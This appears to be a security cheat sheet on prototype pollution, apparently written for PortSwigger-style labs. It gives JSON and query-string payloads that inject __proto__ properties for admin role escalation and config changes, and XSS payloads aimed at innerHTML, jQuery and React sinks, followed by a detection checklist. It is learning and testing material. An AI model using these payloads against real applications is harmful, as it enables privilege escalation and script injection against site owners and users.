# Prototype Pollution - Attack Techniques

## Server-Side Prototype Pollution

### Detection
```json
// In JSON body
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

### Via Query Parameters
```
GET /api?__proto__[isAdmin]=true
GET /api?constructor[prototype][isAdmin]=true
```

### Common Exploits
```json
// Role escalation
{"__proto__": {"role": "admin"}}
{"__proto__": {"isAdmin": true}}

// Configuration pollution
{"__proto__": {"debug": true}}
{"__proto__": {"env": "development"}}
```

## Client-Side Prototype Pollution

### DOM XSS via Prototype Pollution
```javascript
// Pollute Object.prototype with innerHTML
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}

// When app does: element[prop] = value
// It reads polluted innerHTML → XSS
```

### jQuery Selector Sink
```javascript
{"__proto__": {"selector": "<img src=x onerror=alert(1)>"}}
```

### React DangerouslySetInnerHTML
```javascript
{"__proto__": {"dangerouslySetInnerHTML": {"__html": "<img src=x onerror=alert(1)>"}}}
```

## Detection Checklist
- [ ] Can you add `__proto__` to JSON body?
- [ ] Is it reflected in response?
- [ ] Does it persist (stored)?
- [ ] Can you pollute `constructor.prototype`?
- [ ] Are there client-side gadgets?

## PortSwigger Lab Approach
1. Send POST with JSON body containing `__proto__` property
2. Check if response reflects the polluted property
3. If reflected → server-side prototype pollution confirmed
4. Look for gadgets (settings, config objects) that can be polluted
5. Chain with XSS or other vulnerabilities
